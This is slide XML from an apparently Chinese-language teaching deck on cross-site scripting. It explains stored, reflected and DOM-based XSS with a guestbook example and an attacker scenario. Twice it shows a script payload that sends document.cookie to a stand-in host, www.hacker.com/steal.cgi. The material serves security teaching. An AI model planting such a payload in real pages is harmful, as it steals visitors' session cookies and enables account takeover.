        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1145857" y="1456372"/>
            <a:ext cx="6607493" cy="1905953"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="图片 5" descr="说明: act"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3071177" y="3882707"/>
            <a:ext cx="2620645" cy="1397635"/>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r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>储存式</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="430085" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1643063" y="3616325"/>
            <a:ext cx="6092825" cy="1311275"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCFF99"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="10000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2000">
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
              </a:rPr>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2000">
              <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="10000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2000">
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
              </a:rPr>
              <a:t>window.location="http://www.hacker.com/steal.cgi?ck="+document.cookie;</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2000">
              <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="10000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2000">
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
              </a:rPr>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2000">
              <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="430086" name="Text Box 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3614738" y="1733550"/>
            <a:ext cx="1831975" cy="519113"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="標楷體" pitchFamily="65" charset="-120"/>
              </a:rPr>
              <a:t>~</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-TW" altLang="en-US" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="標楷體" pitchFamily="65" charset="-120"/>
              </a:rPr>
              <a:t>留言版</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="標楷體" pitchFamily="65" charset="-120"/>
              </a:rPr>
              <a:t>~</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2800" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              <a:ea typeface="標楷體" pitchFamily="65" charset="-120"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="430087" name="Picture 7"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="741363" y="2405063"/>
            <a:ext cx="7521575" cy="2719387"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="430088" name="Rectangle 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1638300" y="3592513"/>
            <a:ext cx="6092825" cy="1311275"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCFF99"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="10000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
              </a:rPr>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2000">
              <a:solidFill>
                <a:srgbClr val="CC0000"/>
              </a:solidFill>
              <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="10000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
              </a:rPr>
              <a:t>window.location="http://www.hacker.com/steal.cgi?ck="+document.cookie;</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2000">
              <a:solidFill>
                <a:srgbClr val="CC0000"/>
              </a:solidFill>
              <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="10000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
                <a:ea typeface="PMingLiU" pitchFamily="18" charset="-120"/>
              </a:rPr>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="2000">
              <a:solidFill>
                <a:srgbClr val="CC0000"/>
              </a:solidFill>
              <a:latin typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              <a:ea typeface="PMingLiU" pitchFamily="18" charset="-12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296988"/>
            <a:ext cx="7772400" cy="4818062"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" b="0" dirty="0"/>
              <a:t>也称为非持久性跨站脚本攻击，是一种最常见的跨站脚本攻击类型。与本地脚本漏洞不同的是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="0" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" b="0" dirty="0"/>
              <a:t>客户端使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="0" dirty="0"/>
              <a:t>Server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" b="0" dirty="0"/>
              <a:t>端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="0" dirty="0"/>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" b="0" dirty="0"/>
              <a:t>实体编码，客户端代码便能够注入到动态页面中。在这种攻击模式下，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="0" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" b="0" dirty="0"/>
              <a:t>程序不会存储恶意脚本，它会将未经验证的数据通过请求发送给客户端，攻击者就可以构造恶意的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="0" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" b="0" dirty="0"/>
              <a:t>链接或表单并诱骗用户访问，最终达到利用受害者身份执行恶意代码的目的。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" b="0" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>反射式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</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30238" y="1296988"/>
            <a:ext cx="7772400" cy="4818062"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>(1) Alice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>经常浏览</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>Bob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>建立的网站。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>Bob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>的站点运行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>Alice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>使用用户名</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>密码进行登录，并存储敏感信息</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>比如银行帐户信息</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>(2) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1"/>
              <a:t>Charly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>发现</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>Bob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>的站点包含反射性的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>漏洞；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>(3) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1"/>
              <a:t>Charly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>编写一个利用漏洞的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>，并将其冒充为来自</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>Bob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>的邮件发送给</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>Alice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>； </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>(4) Alice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>在登录到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>Bob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>的站点后，浏览</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1"/>
              <a:t>Charly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>提供的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>(5) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>嵌入到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>中的恶意脚本在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>Alice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>的浏览器中执行，就像它直接来自</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>Bob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>的服务器一样。此脚本盗窃敏感信息</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>授权、信用卡、帐号信息等</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>，然后在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>Alice</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>完全不知情的情况下将这些信息发送到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1"/>
              <a:t>Charly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>站点。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="0" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>反射式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:endParaRPr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反射式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="xss"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1133475" y="1477010"/>
            <a:ext cx="7286625" cy="4391638"/>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9288" y="1363663"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>loginsb.asp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>直接向用户显示</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>msg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>参数，这样只要简单构造一个恶意的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>就可以触发一次</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>反射式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4" descr="xss_src"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="986790" y="3020060"/>
            <a:ext cx="7280910" cy="2390140"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>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en-US" altLang="zh-CN" dirty="0"/>
              <a:t>DOM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1026" name="Picture 2"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="185738" y="1290638"/>
            <a:ext cx="8734425" cy="3876675"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4" descr="dom"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1998345" y="5490845"/>
            <a:ext cx="4880610" cy="734060"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solid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96988"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
